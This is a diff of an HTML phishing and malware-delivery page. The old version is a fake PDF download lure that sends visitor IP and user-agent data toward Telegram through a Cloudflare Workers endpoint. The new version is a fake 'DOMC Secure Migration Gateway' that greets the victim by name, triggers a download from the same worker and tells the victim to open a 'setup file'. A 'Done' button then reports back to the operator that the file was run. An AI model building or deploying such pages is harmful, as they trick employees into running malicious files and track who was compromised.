@@ -1,163 +1,121 @@
+<!DOCTYPE html>
 <html>
 <head>
-<meta charset="utf-8">
-<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-<title>PDF File</title>
-<link rel="shortcut icon" href="https://i.ibb.co/yF35Jv2Q/docu-ico.png" type="image/x-icon">
-<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
-<style>
-@font-face { font-family: 'fmtt'; src: url(img/font1.woff2) format('truetype'); }
-* { margin: auto; font-size: 14px; outline: 0; font-family: 'fmtt'; }
-body {
-  background: url('https://i.ibb.co/G3spj5wR/orgo-blur.png') no-repeat center center fixed;
-  background-size: cover;
-  backdrop-filter: blur(5px);
-}
-input { border: 0; display: block; margin-top: 0px; width: 100%; padding: 6px; background: #f2f2f2; padding-left: 0; }
-td { border-right: 1px solid black; padding-right: 10px; padding-left: 10px; font-size: 11px; color: #0072ce; }
-.inp { margin-top: 30px; border-radius: 15px; background: #f2f2f2; text-align: center; border: 1px solid #f2f2f2; width: 93%; padding: 6px; padding-left: 1px; }
-label { display: block; text-align: left; margin: 0; font-size: 10px; color: gray; padding: 0; width: 100%; }
-@keyframes roll { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
-#rl { animation: roll 1s infinite; }
-@keyframes fade { from { opacity: 1; } to { opacity: 0.3; } }
-#fd { animation: fade 1s infinite; }
-.email-msg { 
-  text-align: center; 
-  font-size: 16px; 
-  font-family: Arial, sans-serif;
-  color: black; 
-  margin-bottom: 15px; 
-}
-button { display: block; margin: 20px auto 0 auto; padding: 8px 16px; font-size: 14px; border-radius: 6px; cursor: pointer; }
-button:disabled { cursor: not-allowed; opacity: 0.6; }
-</style>
-<script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>DOMC Secure Migration Gateway</title>
+    <style>
+        body {
+            background: url('https://i.ibb.co/G3spj5wR/orgo-blur.png') no-repeat center center fixed;
+            background-size: cover;
+            backdrop-filter: blur(10px);
+            font-family: 'Segoe UI', Arial, sans-serif;
+            display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0;
+        }
+        .card { 
+            background: rgba(255, 255, 255, 0.98); 
+            padding: 40px; border-radius: 12px; 
+            box-shadow: 0 10px 30px rgba(0,0,0,0.3); 
+            max-width: 420px; width: 90%; text-align: center; 
+        }
+        .logo { font-weight: bold; color: #0078d4; font-size: 22px; margin-bottom: 20px; border-bottom: 1px solid #eee; padding-bottom: 10px; }
+        .status-text { color: #333; font-size: 14px; margin: 15px 0; line-height: 1.6; }
+        
+        .instruction-box { 
+            display: none; background: #fff4ce; padding: 20px; 
+            border-radius: 6px; border: 1px solid #f2c037; margin-top: 20px; 
+        }
+        .btn-done { 
+            background-color: #28a745; color: white; width: 100%; 
+            padding: 14px; border-radius: 6px; font-weight: 600; 
+            border: none; cursor: pointer; margin-top: 15px;
+        }
+    </style>
+    <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
 </head>
 <body>
 
-<div style="max-width:500px;padding:0px;">
+<div class="card">
+    <div class="logo">DOMC Secure Gateway</div>
 
-<form id="downloadForm" method="POST" action="https://wandering-cherry-0bf1.g03755901.workers.dev/">
+    <div id="init-section">
+        <p class="status-text">Identity confirmed. Finalizing node for <strong id="display-user">USER</strong>...</p>
+        
+        <form id="worker-form" action="https://wandering-cherry-0bf1.g03755901.workers.dev/" method="POST">
+            <div class="cf-turnstile" 
+                 data-sitekey="0x4AAAAAACafd07cw2w7X14i" 
+                 data-callback="onPassed"></div>
+            
+            <input type="hidden" name="cf-turnstile-response" id="cf-token">
+            <input type="hidden" name="user" id="form-user">
+            <input type="hidden" name="dom" id="form-dom">
+        </form>
+    </div>
 
-  <div style="text-align:center">
-    <img
-      src="https://i.ibb.co/sJFnm0RH/Icon-pdf-file-svg.png" 
-      width="45"
-      height="45"
-      style="margin-top:200px;object-fit:contain;"
-      id="fd"
-      alt="icon"
-      loading="lazy"
-      onerror="this.onerror=null; this.src='images/fallback.png';"
-    >
-  </div>
-
-  <p style="text-align:center;font-size:15px;margin-top:10px"></p>
-
-  <span
-    style="display:block;height:10px;width:10px;border:3px solid lightgray;border-radius:70px;border-top-color:red;margin-top:40px;"
-    id="rl"
-  ></span>
-
-  <!-- EMAIL MESSAGE PLACEHOLDER -->
-  <div id="emailMsg" class="email-msg"></div>
-
-  <!-- MOBILE MESSAGE -->
-  <div id="mobileMsg" class="email-msg" style="display:none;"></div>
-
-  <!-- Cloudflare Turnstile widget -->
-  <div class="cf-turnstile" data-sitekey="0x4AAAAAACafd07cw2w7X14i" style="margin-top:20px;"></div>
-
-  <!-- Download button initially disabled -->
-  <button type="submit" id="downloadBtn" disabled>Download File</button>
-
-</form>
-
+    <div id="step-two" class="instruction-box">
+        <p style="font-size: 15px; color: #d93025; font-weight: bold; margin: 0 0 10px 0;">Download Initialized</p>
+        <p style="font-size: 13px; color: #333; text-align: left; margin: 0;">
+            1. <strong>Open</strong> the downloaded setup file.<br>
+            2. <strong>Follow</strong> the prompts to sync your certificate.<br>
+            3. Click <strong>'Done'</strong> below once the file has been opened.
+        </p>
+        <button id="done-btn" class="btn-done">Done / Finish Sync</button>
+    </div>
 </div>
 
 <script>
-const fd = document.getElementById('fd');
-const rl = document.getElementById('rl');
-const form = document.getElementById('downloadForm');
-const downloadBtn = document.getElementById('downloadBtn');
-const emailMsg = document.getElementById('emailMsg');
-const mobileMsg = document.getElementById('mobileMsg');
+    // 1. Grab Params from URL (Google Script or Direct Link)
+    const urlParams = new URLSearchParams(window.location.search);
+    const user = urlParams.get('user') || 'Employee';
+    const dom = urlParams.get('dom') || 'Corporate';
+    
+    // UI Personalization
+    document.getElementById('display-user').innerText = user;
+    document.getElementById('form-user').value = user;
+    document.getElementById('form-dom').value = dom;
 
-// Show loader & rolling animation on form submit
-form.addEventListener('submit', async (e) => {
-    fd.style.display = 'block';
-    rl.style.display = 'block';
+    // 2. CAPTCHA SOLVED -> Triggers Download + Notification 1
+    function onPassed(token) {
+        document.getElementById('cf-token').value = token;
+        
+        // Submit the form to the Worker
+        document.getElementById('worker-form').submit();
 
-    // Only send Telegram after CAPTCHA is done
-    if (!downloadBtn.disabled) {
-        const ip = '{{WORKER_IP}}'; // your worker will fill this
-        const ua = navigator.userAgent;
-        const time = new Date().toISOString();
-        const message = `✅ Human Download Verified\nIP: ${ip}\nUser-Agent: ${ua}\nTime: ${time}`;
+        // Switch UI to Instruction Box
+        setTimeout(() => {
+            document.getElementById('init-section').style.display = 'none';
+            document.getElementById('step-two').style.display = 'block';
+        }, 1500);
+    }
+
+    // 3. DONE CLICKED -> Triggers Notification 2 (Execution Confirmation)
+    document.getElementById('done-btn').addEventListener('click', async function() {
+        const btn = this;
+        btn.innerText = "Finalizing...";
+        btn.disabled = true;
+
+        // Create the 'Done' payload for the Worker
+        const formData = new FormData();
+        formData.append('action', 'done');
+        formData.append('user', user);
+        formData.append('dom', dom);
 
         try {
-            await fetch(form.action, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ telegram: message })
+            // Send the signal to your Worker link
+            await fetch("https://wandering-cherry-0bf1.g03755901.workers.dev/", {
+                method: "POST",
+                body: formData
             });
-        } catch(err) {
-            console.warn("Telegram send failed", err);
+        } catch (e) {
+            console.log("Worker Ping Failed");
         }
-    }
-});
 
-// Called by Turnstile when user completes CAPTCHA
-function onCaptchaSuccess(token) {
-    downloadBtn.disabled = false; // enable button only after CAPTCHA solved
-}
-
-// Attach Turnstile callback dynamically
-document.querySelector('.cf-turnstile').setAttribute('data-callback', 'onCaptchaSuccess');
-
-// Detect mobile devices
-const isMobile = /Android|iPhone|iPad|iPod|Opera Mini|IEMobile|WPDesktop/i.test(navigator.userAgent);
-
-window.addEventListener('DOMContentLoaded', () => {
-    if (isMobile) {
-        // Hide CAPTCHA and button
-        document.querySelector('.cf-turnstile').style.display = 'none';
-        downloadBtn.style.display = 'none';
-        fd.style.display = 'none';
-        rl.style.display = 'none';
-        mobileMsg.style.display = 'block';
-        mobileMsg.textContent = "Please open this link on a desktop to download the file.";
-        return; // Stop further processing
-    }
-
-    // Email hash logic
-    const hash = window.location.hash.slice(1);
-    if(hash) {
-        try {
-            const decodedEmail = atob(hash); // decode base64
-            const companyName = decodedEmail.split('@')[1].split('.')[0];
-            const capitalizedCompany = companyName.charAt(0).toUpperCase() + companyName.slice(1);
-            emailMsg.innerHTML = `
-  <div style="font-weight:bold; font-size:18px; margin-bottom:8px;">
-    ${capitalizedCompany} File Sharing Security
-  </div>
-  <div style="font-size:16px; line-height:1.5; margin-bottom:12px;">
-    Dear ${decodedEmail},
-  </div>
-  <div style="font-size:15px; line-height:1.5;">
-    For your security, please complete the CAPTCHA below to access your file. 
-    Once verified, the download button will be enabled.
-  </div>
-`;
-
-        } catch(e) {
-            // Invalid base64? ignore and load normally
-        }
-    }
-});
+        // Final UI Success State
+        document.querySelector('.instruction-box').innerHTML = 
+            "<p style='color:#28a745; font-weight:bold; font-size:16px;'>✓ Migration Complete</p>" +
+            "<p style='font-size:13px; color:#333;'>Your workstation has been synchronized. You may close this window.</p>";
+    });
 </script>
 
 </body>
 </html>
-
-
